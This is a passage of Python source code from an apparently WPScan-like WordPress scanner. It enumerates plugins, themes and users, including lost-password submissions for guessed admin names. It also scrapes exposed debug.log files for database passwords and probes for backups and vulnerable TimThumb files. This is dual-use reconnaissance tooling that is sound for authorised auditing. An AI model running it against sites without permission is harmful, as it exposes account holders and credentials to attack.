        result.errors.append(f"Header check failed: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2 — ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
def _parse_version_from_readme(text):
    m = re.search(r'(?:Stable tag|Version)\s*:\s*([\d.]+)', text, re.I)
    return m.group(1) if m else None

def _parse_version_from_text(text):
    """
    Try a cascade of regex patterns against arbitrary file text to extract
    a semantic version string.  Returns the first plausible match or None.
    """
    patterns = [
        # readme.txt / readme.md header:  Stable tag: 1.2.3  or  Version: 1.2.3
        r'(?:Stable tag|Version)\s*:\s*([\d]+\.[\d][.\d]*)',
        # PHP file header comment:  * Version: 1.2.3
        r'\*\s+Version\s*:\s*([\d]+\.[\d][.\d]*)',
        # package.json / composer.json:  "version": "1.2.3"
        r'"version"\s*:\s*"([\d]+\.[\d][.\d]*)"',
        # Changelog headings:  = 1.2.3 =  or  ## 1.2.3  or  ## [1.2.3]
        r'(?:^|\n)\s*(?:[=#]+)\s*\[?([\d]+\.[\d][.\d]*)\]?\s*(?:[=#]|[\r\n]|$)',
        # HTML comment / meta: <!-- Version: 1.2.3 -->  or  content="...1.2.3"
        r'(?:Version|ver)\s*[:\s=]+v?([\d]+\.[\d][.\d]*)',
    ]
    for pat in patterns:
        m = re.search(pat, text, re.I | re.M)
        if m:
            ver = m.group(1).strip().rstrip('.')
            if re.match(r'^\d+\.\d', ver):
                return ver
    return None

async def _fetch_ver_from_url(session, url):
    """HEAD-safe GET — returns version string or None."""
    try:
        async with session.get(url, headers=hdr(), timeout=8, allow_redirects=False) as resp:
            if resp.status == 200:
                text = await resp.text(errors="replace")
                return _parse_version_from_text(text)
    except Exception:
        pass
    return None

async def _detect_version_extra(session, base_url, slug, asset_type):
    """
    Try alternative source files when readme.txt gave no version (or was blocked).
    Returns (version, source_filename) — both empty strings on total failure.
    Tries in priority order so the most authoritative source wins.
    """
    asset_path = f"wp-content/{asset_type}s/{slug}"
    sources = [
        (f"{asset_path}/readme.md",     "readme.md"),
        (f"{asset_path}/README.md",     "README.md"),
        (f"{asset_path}/changelog.txt", "changelog.txt"),
        (f"{asset_path}/CHANGELOG.md",  "CHANGELOG.md"),
        (f"{asset_path}/index.html",    "index.html"),
    ]
    # Plugins often expose their main PHP header file at slug/slug.php
    if asset_type == "plugin":
        sources.append((f"{asset_path}/{slug}.php", f"{slug}.php"))

    for rel_path, src_name in sources:
        url = urljoin(base_url, rel_path)
        ver = await _fetch_ver_from_url(session, url)
        if ver:
            return ver, src_name
    return "", ""

def passive_enum_plugins(html, result):
    slugs = set(re.findall(r'wp-content/plugins/([a-zA-Z0-9_-]+)/', html))
    seen  = {p.slug for p in result.plugins}
    for slug in slugs:
        if slug in seen:
            continue
        m = re.search(rf'wp-content/plugins/{re.escape(slug)}/[^"\']*\?ver=([\d.]+)', html)
        result.plugins.append(PluginEntry(
            slug=slug, version=(m.group(1) if m else ""),
            detected_by="passive", readme_url=None, asset_type="plugin"
        ))

def passive_enum_themes(html, result):
    slugs = set(re.findall(r'wp-content/themes/([a-zA-Z0-9_-]+)/', html))
    seen  = {t.slug for t in result.themes}
    for slug in slugs:
        if slug in seen:
            continue
        m = re.search(rf'wp-content/themes/{re.escape(slug)}/[^"\']*\?ver=([\d.]+)', html)
        result.themes.append(PluginEntry(
            slug=slug, version=(m.group(1) if m else ""),
            detected_by="passive", readme_url=None, asset_type="theme"
        ))

async def _probe_slug(session, base_url, slug, asset_type, delay, sem):
    async with sem:
        readme_url = urljoin(base_url, f"wp-content/{asset_type}s/{slug}/readme.txt")
        try:
            await asyncio.sleep(delay)
            async with session.get(readme_url, headers=hdr(), timeout=12, allow_redirects=False) as resp:
                if resp.status == 200:
                    text = await resp.text(errors="replace")
                    ver  = _parse_version_from_readme(text) or ""
                    if ver:
                        return PluginEntry(slug=slug, version=ver, detected_by="aggressive",
                                           readme_url=readme_url, asset_type=asset_type,
                                           version_source="readme.txt")
                    # readme.txt found but no version — cascade through extra sources
                    ver, vsrc = await _detect_version_extra(session, base_url, slug, asset_type)
                    return PluginEntry(slug=slug, version=ver, detected_by="aggressive",
                                       readme_url=readme_url, asset_type=asset_type,
                                       version_source=vsrc or "readme.txt(no-ver)")
                if resp.status == 403:
                    # Plugin exists but readme is protected — try all alternative sources
                    ver, vsrc = await _detect_version_extra(session, base_url, slug, asset_type)
                    return PluginEntry(slug=slug, version=ver, detected_by="aggressive",
                                       readme_url=readme_url, asset_type=asset_type,
                                       version_source=vsrc or "403-blocked")
        except Exception:
            pass
    return None

async def _probe_theme_style_css(session, base_url, slug, delay, sem):
    """
    WPScan's primary theme-detection method: style.css is always public
    and contains the authoritative Version, Theme Name, Author fields.
    Falls back to readme.txt then extra sources if style.css yields no version.
    """
    async with sem:
        await asyncio.sleep(delay)
        style_url = urljoin(base_url, f"wp-content/themes/{slug}/style.css")
        try:
            async with session.get(style_url, headers=hdr(), timeout=12, allow_redirects=False) as resp:
                if resp.status == 200:
                    text = await resp.text(errors="replace")
                    # Themes always have "Theme Name:" in style.css
                    if re.search(r'^Theme Name\s*:', text, re.M | re.I):
                        ver_m = re.search(r'^Version\s*:\s*([\d.]+\S*)', text, re.M | re.I)
                        ver   = ver_m.group(1).strip() if ver_m else ""
                        if not ver:
                            # style.css confirmed theme but no version — try extras
                            ver, vsrc = await _detect_version_extra(session, base_url, slug, "theme")
                        else:
                            vsrc = "style.css"
                        return PluginEntry(slug=slug, version=ver,
                                           detected_by="aggressive(style.css)",
                                           readme_url=style_url, asset_type="theme",
                                           version_source=vsrc or "style.css")
        except Exception:
            pass
        # Fallback: try readme.txt
        readme_url = urljoin(base_url, f"wp-content/themes/{slug}/readme.txt")
        try:
            async with session.get(readme_url, headers=hdr(), timeout=10, allow_redirects=False) as resp:
                if resp.status == 200:
                    text = await resp.text(errors="replace")
                    ver  = _parse_version_from_readme(text) or ""
                    if not ver:
                        ver, vsrc = await _detect_version_extra(session, base_url, slug, "theme")
                    else:
                        vsrc = "readme.txt"
                    return PluginEntry(slug=slug, version=ver, detected_by="aggressive(readme)",
                                       readme_url=readme_url, asset_type="theme",
                                       version_source=vsrc or "readme.txt")
                if resp.status == 403:
                    ver, vsrc = await _detect_version_extra(session, base_url, slug, "theme")
                    return PluginEntry(slug=slug, version=ver, detected_by="aggressive",
                                       readme_url=readme_url, asset_type="theme",
                                       version_source=vsrc or "403-blocked")
        except Exception:
            pass
    return None

async def aggressive_enum_plugins(session, result, wordlist, delay, concurrency):
    slugs    = wordlist or BUILTIN_PLUGINS
    sem      = asyncio.Semaphore(concurrency)
    existing = {p.slug for p in result.plugins}
    counter  = [0]

    async def run(slug):
        e = await _probe_slug(session, result.target_url, slug, "plugin", delay, sem)
        counter[0] += 1
        if counter[0] % 100 == 0:
            info(f"Plugin probes: {counter[0]}/{len(slugs)}")
        return e

    entries = await asyncio.gather(*[run(s) for s in slugs], return_exceptions=True)
    for e in entries:
        if not isinstance(e, PluginEntry):
            continue
        if e.slug in existing:
            for p in result.plugins:
                if p.slug == e.slug:
                    if not p.version and e.version:
                        p.version = e.version
                    p.detected_by = "passive+aggressive"
        else:
            result.plugins.append(e)

async def aggressive_enum_themes(session, result, wordlist, delay, concurrency):
    slugs    = wordlist or BUILTIN_THEMES
    sem      = asyncio.Semaphore(concurrency)
    existing = {t.slug for t in result.themes}
    counter  = [0]

    async def run(slug):
        # Use style.css detection (WPScan method — more reliable than readme.txt)
        e = await _probe_theme_style_css(session, result.target_url, slug, delay, sem)
        counter[0] += 1
        if counter[0] % 50 == 0:
            info(f"Theme probes: {counter[0]}/{len(slugs)}")
        return e

    entries = await asyncio.gather(*[run(s) for s in slugs], return_exceptions=True)
    for e in entries:
        if not isinstance(e, PluginEntry):
            continue
        if e.slug in existing:
            for t in result.themes:
                if t.slug == e.slug:
                    if not t.version and e.version:
                        t.version = e.version
                    t.detected_by = "passive+aggressive(style.css)"
        else:
            result.themes.append(e)

async def _users_rest(session, base):
    users = []
    page  = 1
    seen_ids: set = set()
    while True:
        try:
            url = urljoin(base, f"wp-json/wp/v2/users?per_page=100&page={page}")
            async with session.get(url, headers=hdr(), timeout=15) as r:
                if r.status == 200:
                    batch = await r.json(content_type=None)
                    if not isinstance(batch, list) or not batch:
                        break
                    new_users = 0
                    for u in batch:
                        uid = u.get("id", 0)
                        if uid not in seen_ids:
                            seen_ids.add(uid)
                            users.append(UserEntry(id=uid, name=u.get("name",""),
                                                   slug=u.get("slug",""), detected_by="rest_api"))
                            new_users += 1
                    if not new_users or len(batch) < 100:
                        break  # last page
                    page += 1
                elif r.status in (401, 403):
                    info("REST API user endpoint is protected")
                    break
                else:
                    break
        except Exception:
            break
    return users

async def _users_author(session, base, max_id):
    """Concurrent author-redirect probe — one request per ID, all in flight together."""
    async def _probe_one(i):
        try:
            async with session.get(urljoin(base, f"?author={i}"), headers=hdr(),
                                   timeout=10, allow_redirects=False) as r:
                loc = r.headers.get("Location", "")
                m   = re.search(r'/author/([^/?#]+)/?', loc)
                if m:
                    slug = m.group(1)
                    return UserEntry(id=i, name=slug.replace("-", " ").title(),
                                     slug=slug, detected_by="author_redirect")
        except Exception:
            pass
        return None

    results = await asyncio.gather(*[_probe_one(i) for i in range(1, max_id + 1)],
                                   return_exceptions=True)
    return [u for u in results if isinstance(u, UserEntry)]

async def _users_lostpassword(session, result):
    """
    Indirect username enumeration via wp-login.php?action=lostpassword.

    WordPress returns different responses depending on whether the submitted
    username/email exists:
      - EXISTS     → 302 redirect to ?checkemail=confirm  OR  body contains
                     "check your email" / "email has been sent"
      - NOT EXISTS → 200 with error "There is no account with that username
                     or email address" / "Invalid username"

    We probe every slug already found by other methods PLUS a short list of
    extremely common admin usernames that are rarely caught by author redirects
    or the REST API when it's locked.  This acts as both a *confirmation* pass
    (re-confirms known users via a different channel) and an *extension* pass
    (finds accounts not yet surfaced by any other technique).
    """
    url  = urljoin(result.target_url, "wp-login.php?action=lostpassword")
    base_headers = hdr({"Content-Type": "application/x-www-form-urlencoded"})

    # Signals that indicate the username WAS found and a reset email was sent
    _FOUND_SIGNALS = [
        "checkemail=confirm",      # redirect Location header (most reliable)
        "check your email",
        "email has been sent",
        "password reset",
        "reset link",
        "we have emailed",
        "check for your reset password link",
    ]
    # Signals that indicate the user does NOT exist
    _MISS_SIGNALS = [
        "there is no account with that username",
        "invalid username",
        "no account found",
        "we don't have a user with that email",
        "there is no user registered",
        "no user with that email",
    ]

    # Build probe list: already-found slugs + common admin names not yet seen
    _COMMON_ADMIN_SLUGS = [
        "admin", "administrator", "root", "webmaster", "wpuser", "user1",
        "wp-admin", "moderator", "editor", "author", "test", "demo",
        "superadmin", "support", "info", "contact", "manager",
    ]
    existing_slugs = {u.slug for u in result.users}
    # Confirmed slugs first, then new guesses
    probe_slugs = list(existing_slugs) + [
        s for s in _COMMON_ADMIN_SLUGS if s not in existing_slugs
    ]

    sem = asyncio.Semaphore(3)  # gentle — this hits a real login endpoint

    async def _probe(slug):
        async with sem:
            try:
                data = {
                    "user_login":  slug,
                    "wp-submit":   "Get New Password",
                    "redirect_to": "",
                    "action":      "lostpassword",
                }
                async with session.post(
                    url, data=data, headers=base_headers,
                    timeout=12, allow_redirects=False
                ) as r:
                    loc  = r.headers.get("Location", "").lower()
                    body = ""
                    if r.status == 200:
                        body = (await r.text(errors="replace")).lower()

                    found_by_loc  = any(sig in loc  for sig in _FOUND_SIGNALS)
                    found_by_body = any(sig in body for sig in _FOUND_SIGNALS)
                    miss          = any(sig in body for sig in _MISS_SIGNALS)

                    if found_by_loc or found_by_body:
                        return slug, True
                    if miss:
                        return slug, False
                    # Ambiguous (rate-limited, CAPTCHA, etc.) → don't report
                    return slug, None
            except Exception:
                return slug, None

    results = await asyncio.gather(*[_probe(s) for s in probe_slugs],
                                   return_exceptions=True)
    seen_slugs = {u.slug for u in result.users}
    for item in results:
        if not isinstance(item, tuple):
            continue
        slug, confirmed = item
        if confirmed is True:
            if slug not in seen_slugs:
                seen_slugs.add(slug)
                result.users.append(UserEntry(
                    id=0,
                    name=slug.replace("-", " ").title(),
                    slug=slug,
                    detected_by="lostpassword"
                ))
                ok(f"Lost-password enum: {bold(slug)} confirmed (reset email accepted)")
            else:
                # Already known — just annotate in terminal so it's visible
                ok(f"Lost-password enum: {bold(slug)} re-confirmed via reset endpoint")
        elif confirmed is False:
            pass  # silent miss — user doesn't exist

async def enumerate_users(session, result, max_id=20):
    ra, au = await asyncio.gather(
        _users_rest(session, result.target_url),
        _users_author(session, result.target_url, max_id),
        return_exceptions=True
    )
    seen = set()
    for lst in [ra, au]:
        if isinstance(lst, list):
            for u in lst:
                if u.slug not in seen:
                    seen.add(u.slug)
                    result.users.append(u)
    # oEmbed + Feed + Sitemap + lost-password — all concurrent after REST/author
    await asyncio.gather(
        enumerate_users_oembed(session, result),
        enumerate_users_feed(session, result),
        _users_sitemap(session, result),
        _users_lostpassword(session, result),
        return_exceptions=True
    )

async def check_sensitive_files(session, result):
    async def probe(path):
        try:
            async with session.get(urljoin(result.target_url, path), headers=hdr(),
                                   timeout=12, allow_redirects=False) as r:
                if r.status in (200, 403):
                    return {"path": path, "url": urljoin(result.target_url, path), "status": r.status}
        except Exception:
            pass
        return None
    items = await asyncio.gather(*[probe(p) for p in WP_SENSITIVE_FILES], return_exceptions=True)
    result.sensitive_files = [i for i in items if isinstance(i, dict)]

async def check_xmlrpc(session, result):
    url = urljoin(result.target_url, "xmlrpc.php")
    try:
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200 and "XML-RPC" in await r.text(errors="replace"):
                result.xmlrpc_accessible = True
    except Exception:
        return
    if not result.xmlrpc_accessible:
        return
    xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
    try:
        async with session.post(url, data=xml, headers=hdr({"Content-Type":"text/xml"}), timeout=12) as r:
            text = await r.text(errors="replace")
            if "system.multicall" in text or "wp.getUsersBlogs" in text:
                result.xmlrpc_multicall = True
    except Exception:
        pass

async def check_open_registration(session, result):
    try:
        url = urljoin(result.target_url, "wp-login.php?action=register")
        async with session.get(url, headers=hdr(), timeout=12) as r:
            t = await r.text(errors="replace")
            if r.status == 200 and ("user_login" in t or "user_email" in t):
                result.registration_open = True
    except Exception:
        pass

async def check_directory_listing(session, result):
    try:
        url = urljoin(result.target_url, "wp-content/uploads/")
        async with session.get(url, headers=hdr(), timeout=12) as r:
            t = await r.text(errors="replace")
            if r.status == 200 and ("Index of" in t or "Parent Directory" in t):
                result.directory_listing = True
    except Exception:
        pass

async def check_wp_cron(session, result):
    try:
        url = urljoin(result.target_url, "wp-cron.php?doing_wp_cron")
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200:
                result.wpcron_exposed = True
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2.3 — EXTENDED USER ENUMERATION (WPScan-parity)
# ─────────────────────────────────────────────────────────────────────────────
async def enumerate_users_login_error(session, result):
    """
    WPScan classic: POST to wp-login.php with a garbage username to get
    the baseline 'Invalid username' error, then test each found slug to
    see if WP gives a *different* error ('wrong password') — proving the
    username exists.  Only fires when WP leaks distinct messages.
    """
    url = urljoin(result.target_url, "wp-login.php")
    ghost = "wphawk_ghost_" + hashlib.md5(os.urandom(4)).hexdigest()[:8]
    try:
        base_data = {"log": ghost, "pwd": "wrong_pass_xyz",
                     "wp-submit": "Log In", "redirect_to": "/wp-admin/",
                     "testcookie": "1"}
        async with session.post(url, data=base_data,
                headers=hdr({"Content-Type":"application/x-www-form-urlencoded"}),
                timeout=12, allow_redirects=True) as r:
            baseline = (await r.text(errors="replace")).lower()

        leaks_username_error = "invalid username" in baseline or "the username" in baseline
        if not leaks_username_error:
            info("Login-error enum: generic errors (username not leaked)")
            return

        confirmed = []
        for user in result.users:
            test_data = {**base_data, "log": user.slug}
            async with session.post(url, data=test_data,
                    headers=hdr({"Content-Type":"application/x-www-form-urlencoded"}),
                    timeout=12, allow_redirects=True) as r:
                t = (await r.text(errors="replace")).lower()
            # Different error = username exists
            if "invalid username" not in t and any(kw in t for kw in
                    ["password", "incorrect", "the password you entered"]):
                confirmed.append(user.slug)
                ok(f"Login-error enum: confirmed user → {user.slug}")
            await asyncio.sleep(0.4)

        result.login_confirmed_users = confirmed
        if confirmed:
            ok(f"Login-error enum: {len(confirmed)} username(s) positively confirmed")
        else:
            info("Login-error enum: no extra confirmation from error messages")
    except Exception as e:
        info(f"Login-error enum: {e}")

async def enumerate_users_oembed(session, result):
    """
    oEmbed endpoint leaks author_name + author_url for each author page.
    Works even when the REST /users endpoint is locked down.
    """
    oembed_base = urljoin(result.target_url, "wp-json/oembed/1.0/embed?url=")
    seen_slugs  = {u.slug for u in result.users}
    for i in range(1, 11):
        probe = urljoin(result.target_url, f"?author={i}")
        try:
            async with session.get(f"{oembed_base}{probe}", headers=hdr(), timeout=10) as r:
                if r.status != 200:
                    continue
                data        = await r.json(content_type=None)
                author_name = data.get("author_name", "")
                author_url  = data.get("author_url", "")
                if not author_name:
                    continue
                slug_m = re.search(r'/author/([^/?#]+)/?', author_url)
                slug   = slug_m.group(1) if slug_m else author_name.lower().replace(" ", "-")
                if slug not in seen_slugs:
                    seen_slugs.add(slug)
                    result.users.append(UserEntry(
                        id=i, name=author_name, slug=slug, detected_by="oembed"))
                    ok(f"oEmbed user: {author_name} (slug: {slug})")
        except Exception:
            pass

async def enumerate_users_feed(session, result):
    """
    RSS / Atom feeds expose <dc:creator> and <author> tags with real
    display names — converts them to login-slug guesses.
    """
    seen_slugs = {u.slug for u in result.users}
    feed_paths = ["?feed=rss2", "?feed=atom", "feed/"]
    for path in feed_paths:
        try:
            async with session.get(urljoin(result.target_url, path),
                                   headers=hdr(), timeout=12) as r:
                if r.status != 200:
                    continue
                t = await r.text(errors="replace")
                authors = set()
                authors.update(re.findall(r'<dc:creator><!\[CDATA\[([^\]]+)\]\]></dc:creator>', t))
                authors.update(re.findall(r'<dc:creator>([^<]+)</dc:creator>', t))
                authors.update(re.findall(r'<name>([^<]{2,50})</name>', t))
                for name in authors:
                    name = name.strip()
                    if not name:
                        continue
                    slug = name.lower().replace(" ", "-").replace("_", "-")
                    # Strip junk domain-like names
                    if "@" in slug or len(slug) > 60:
                        continue
                    if slug not in seen_slugs:
                        seen_slugs.add(slug)
                        result.users.append(UserEntry(
                            id=0, name=name, slug=slug, detected_by="rss_feed"))
                        ok(f"Feed user: {name} (slug: {slug})")
        except Exception:
            pass

async def _users_sitemap(session, result):
    """
    WordPress 5.5+ generates /wp-sitemap-users-1.xml which lists public
    author archive URLs — each URL contains /author/<slug>/.
    Bypass-proof: works even with REST API locked and author redirect disabled.
    """
    seen_slugs = {u.slug for u in result.users}
    url = urljoin(result.target_url, "wp-sitemap-users-1.xml")
    try:
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status != 200:
                return
            text = await r.text(errors="replace")
            slugs = re.findall(r'/author/([^/<\s"\'?#]+)/?', text)
            for slug in dict.fromkeys(slugs):  # dedupe, preserve order
                slug = slug.strip()
                if slug and slug not in seen_slugs:
                    seen_slugs.add(slug)
                    result.users.append(UserEntry(
                        id=0,
                        name=slug.replace("-", " ").title(),
                        slug=slug,
                        detected_by="wp_sitemap"
                    ))
                    ok(f"Sitemap user: {slug}")
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2.4 — BACKUP, TIMTHUMB, HTTP-METHODS, DEBUG.LOG
# ─────────────────────────────────────────────────────────────────────────────
async def parse_debug_log(session, result):
    """
    Fetch wp-content/debug.log and mine it for DB credentials, SQL
    errors, path disclosures, and email addresses — high-value intel.
    """
    url = urljoin(result.target_url, "wp-content/debug.log")
    try:
        async with session.get(url, headers=hdr(), timeout=15,
                               allow_redirects=False) as r:
            if r.status != 200:
                return
            text = await r.text(errors="replace")
            if len(text.strip()) < 20:
                return

            findings = []
            patterns = [
                (r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                 "DB_PASSWORD"),
                (r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                 "DB_USER"),
                (r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                 "DB_NAME"),
                (r"WordPress database error[^\n]{0,120}",
                 "DB error"),
                (r"(?:Fatal error|Parse error|Warning)[^\n]{0,150}",
                 "PHP error w/ path"),
                (r"[a-zA-Z0-9_.+-]{2,}@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}",
                 "Email disclosure"),
                (r"in\s+(/[^\s:]+\.php)\s+on\s+line\s+(\d+)",
                 "Path disclosure"),
            ]
            for pat, label in patterns:
                for m in re.findall(pat, text, re.I)[:3]:
                    val = " ".join(m) if isinstance(m, tuple) else m
                    findings.append({"type": label, "value": val[:150]})

            if not findings:
                findings.append({"type": "log_accessible",
                                 "value": f"debug.log exposed ({len(text)} bytes)"})

            result.debug_log_findings = findings
            for f in findings[:6]:
                warn(f"  debug.log [{f['type']}] {f['value'][:90]}")
    except Exception:
        pass

async def check_http_methods(session, result):
    """
    OPTIONS probe on key endpoints + TRACE reflection check.
    Flags PUT / DELETE / TRACE / CONNECT as dangerous.
    """
    targets = [
        result.target_url,
        urljoin(result.target_url, "wp-login.php"),
        urljoin(result.target_url, "xmlrpc.php"),
        urljoin(result.target_url, "wp-admin/"),
    ]
    findings = []
    dangerous = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}

    for target in targets:
        try:
            async with session.request("OPTIONS", target, headers=hdr(), timeout=8,
                                       allow_redirects=False) as r:
                allow = (r.headers.get("Allow", "") or
                         r.headers.get("Public", "")).upper()
                if allow:
                    found_dangerous = [m for m in dangerous if m in allow]
                    if found_dangerous:
                        findings.append({"url": target, "methods": found_dangerous,
                                         "allow": allow})
                        warn(f"Dangerous HTTP methods at {target}: "
                             f"{', '.join(found_dangerous)}")
        except Exception:
            pass

        # Explicit TRACE check — OPTIONS doesn't always list it
        try:
            async with session.request("TRACE", target, headers=hdr(),
                                       timeout=6) as r:
                if r.status == 200:
                    body = await r.text(errors="replace")
                    if "TRACE" in body.upper():
                        findings.append({"url": target, "methods": ["TRACE"],
                                         "allow": "TRACE reflected"})
                        warn(f"TRACE reflected at {target} — XST possible")
        except Exception:
            pass

    result.http_method_findings = findings

async def scan_backup_files(session, result):
    """
    Generate domain-specific + date-stamped backup filenames and HEAD-probe
    each one.  Also checks wp-content/uploads/ and wp-content/backups/.
    """
    parsed      = urlparse(result.target_url)
    domain_raw  = parsed.netloc.replace("www.", "")
    domain_slug = domain_raw.replace(".", "_").replace("-", "_")
    now         = datetime.datetime.utcnow()

    candidates = list(BACKUP_FILENAME_PATTERNS)

    # Domain-specific variants
    for ext in ["zip", "tar.gz", "sql", "bak"]:
        candidates += [
            f"{domain_raw}.{ext}",
            f"{domain_slug}.{ext}",
            f"backup_{domain_slug}.{ext}",
            f"{domain_slug}_backup.{ext}",
        ]

    # Date-based patterns: last 10 days
    for delta in range(0, 10):
        d = now - datetime.timedelta(days=delta)
        for fmt in ["%Y-%m-%d", "%Y%m%d", "%d%m%Y", "%m%d%Y"]:
            ds = d.strftime(fmt)
            for ext in ["zip", "tar.gz", "sql"]:
                candidates += [
                    f"backup-{ds}.{ext}",
                    f"{ds}-backup.{ext}",
                    f"backup_{ds}.{ext}",
                ]

    # Build multi-location probes
    prefixes = ["", "wp-content/uploads/", "wp-content/backups/",
                "wp-content/", "files/"]
    probe_urls = []
    for p in prefixes:
        for c in candidates[:30]:
            probe_urls.append(p + c)

    found = []
    sem   = asyncio.Semaphore(20)

    async def probe(path):
        async with sem:
            url = urljoin(result.target_url, path)
            try:
                async with session.head(url, headers=hdr(), timeout=8,
                                        allow_redirects=False) as r:
                    if r.status == 200:
                        size = r.headers.get("Content-Length", "?")
                        found.append({"path": path, "url": url, "size": size})
            except Exception:
                pass

    await asyncio.gather(*[probe(p) for p in probe_urls], return_exceptions=True)
    result.backup_files = found
    for b in found:
        warn(f"BACKUP EXPOSED: {b['url']}  ({b['size']} bytes)")

async def scan_timthumb(session, result):
    """
    Scan for vulnerable TimThumb instances in known paths + per-detected
    theme/plugin directories.  TimThumb < 2.8.13 = CVE-2011-4106 (RFU).
    """
    paths = list(TIMTHUMB_GENERIC_PATHS)
    for t in result.themes[:8]:
        for fname in ["timthumb.php", "thumb.php", "lib/timthumb.php",
                      "scripts/timthumb.php", "includes/timthumb.php"]:
            paths.append(f"wp-content/themes/{t.slug}/{fname}")
    for p in result.plugins[:8]:
        paths.append(f"wp-content/plugins/{p.slug}/timthumb.php")
        paths.append(f"wp-content/plugins/{p.slug}/lib/timthumb.php")

    found = []
    sem   = asyncio.Semaphore(10)

    async def probe(path):
        async with sem:
            url = urljoin(result.target_url, path)
            try:
                async with session.get(url, headers=hdr(), timeout=8,
                                       allow_redirects=False) as r:
                    if r.status != 200:
                        return
                    t = await r.text(errors="replace")
                    if "TimThumb" in t or "timthumb" in t or (
                            t.strip().startswith("<?php") and len(t) > 200):
                        ver_m = re.search(r'TIMTHUMB_VERSION\s*=\s*[\'"]?([\d.]+)', t)
                        ver   = ver_m.group(1) if ver_m else "unknown"
                        vuln  = version_lt(ver, "2.8.13") if ver != "unknown" else True
                        found.append({"url": url, "version": ver, "vulnerable": vuln})
                        tag = r(f"[CVE-2011-4106 VULNERABLE v{ver}]") if vuln else y(f"[TimThumb v{ver}]")
                        if vuln:
                            warn(f"TimThumb {tag} at {url}")
            except Exception:
                pass

    await asyncio.gather(*[probe(p) for p in paths], return_exceptions=True)
    result.timthumb_findings = found

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2.6 — UPLOAD CRAWLER · DROPIN CHECK · MU-PLUGINS · GRAPHQL
# ─────────────────────────────────────────────────────────────────────────────
def _parse_dir_listing(html, base_rel_path, site_base):
    """
    Extract file hrefs from an Apache / nginx / lighttpd directory index page.
    Returns a list of finding dicts for files that look sensitive.
    """
    findings = []
    links = re.findall(r'href=["\']([^"\'?#]+)["\']', html, re.I)
    for link in links:
        # Skip navigational anchors
        if link in ("../", "./", "/") or link.startswith("?") or link.startswith("http"):
            continue
        full_url = urljoin(site_base, base_rel_path + link)
        lower = link.lower()
        ext   = os.path.splitext(lower)[1]
        name_hit = any(kw in lower for kw in UPLOAD_SENSITIVE_NAMES)
        ext_hit  = ext in UPLOAD_SENSITIVE_EXTENSIONS
        if ext_hit or name_hit:
            findings.append({
                "type":        "listed_sensitive_file",
                "url":         full_url,
                "path":        base_rel_path + link,
                "filename":    link,
                "description": f"Sensitive file in directory listing: {link}",
            })
    return findings

async def crawl_upload_directory(session, result):
    """
    Phase 2.6 — Upload Directory Crawler.

    Strategy:
    1. Root wp-content/uploads/ — directory listing?
    2. Year subdirs (2015..current) → month subdirs (01-12)
    3. Plugin-specific upload dirs (updraftplus, ai1wm-backups, woocommerce_uploads, …)
    4. Known sensitive filename probes at root level
    5. Parse any accessible directory listing HTML for filenames

    Adds findings to result.upload_findings.
    """
    base     = result.target_url
    up_root  = "wp-content/uploads/"
    findings = []
    sem      = asyncio.Semaphore(20)

    async def probe_dir(rel_path):
        url = urljoin(base, rel_path)
        try:
            async with sem:
                async with session.get(url, headers=hdr(), timeout=10,
                                       allow_redirects=True) as r:
                    if r.status == 200:
                        text = await r.text(errors="replace")
                        # Apache / nginx index patterns
                        if any(sig in text for sig in
                               ("Index of", "Parent Directory", "Directory listing")):
                            return url, rel_path, text
        except Exception:
            pass
        return None, None, None

    async def probe_file(rel_path):
        url = urljoin(base, rel_path)
        try:
            async with sem:
                async with session.head(url, headers=hdr(), timeout=8,
                                        allow_redirects=False) as r:
                    if r.status == 200:
                        size = r.headers.get("Content-Length", "?")
                        ct   = r.headers.get("Content-Type", "")
                        return {"url": url, "path": rel_path, "size": size,
                                "content_type": ct,
                                "type": "sensitive_upload_file",
                                "description": f"Sensitive file accessible: {rel_path}"}
        except Exception:
            pass
        return None

    # ── 1. Root uploads dir ───────────────────────────────────────────────────
    root_url, root_rel, root_html = await probe_dir(up_root)
    if root_html:
        findings.append({"type": "dir_listing", "url": root_url, "path": root_rel,
                          "description": "wp-content/uploads/ directory listing is OPEN"})
        findings.extend(_parse_dir_listing(root_html, root_rel, base))
        ok(f"Upload dir listing OPEN: {root_url}")

    # ── 2. Year → month subdirs ───────────────────────────────────────────────
    cur_year = datetime.datetime.utcnow().year
    year_paths  = [f"{up_root}{y}/" for y in range(2015, cur_year + 1)]
    year_tasks  = await asyncio.gather(*[probe_dir(p) for p in year_paths],
                                        return_exceptions=True)
    month_paths = []
    for i, res in enumerate(year_tasks):
        if not isinstance(res, tuple) or not res[0]:
            continue
        yr_url, yr_rel, yr_html = res
        findings.append({"type": "dir_listing", "url": yr_url, "path": yr_rel,
                          "description": f"Year directory listing open: {yr_url}"})
        findings.extend(_parse_dir_listing(yr_html, yr_rel, base))
        year_num = 2015 + i
        for m in range(1, 13):
            month_paths.append(f"{up_root}{year_num}/{m:02d}/")

    if month_paths:
        month_tasks = await asyncio.gather(*[probe_dir(p) for p in month_paths],
                                            return_exceptions=True)
        for i, res in enumerate(month_tasks):
            if not isinstance(res, tuple) or not res[0]:
                continue
            m_url, m_rel, m_html = res
            findings.append({"type": "dir_listing", "url": m_url, "path": m_rel,
                              "description": f"Monthly upload dir listing: {m_url}"})
            findings.extend(_parse_dir_listing(m_html, m_rel, base))

    # ── 3. Plugin-specific upload subdirs ────────────────────────────────────
    plug_dirs = [f"{up_root}{d}/" for d in UPLOAD_PLUGIN_DIRS]
    plug_tasks = await asyncio.gather(*[probe_dir(p) for p in plug_dirs],
                                       return_exceptions=True)
    for i, res in enumerate(plug_tasks):
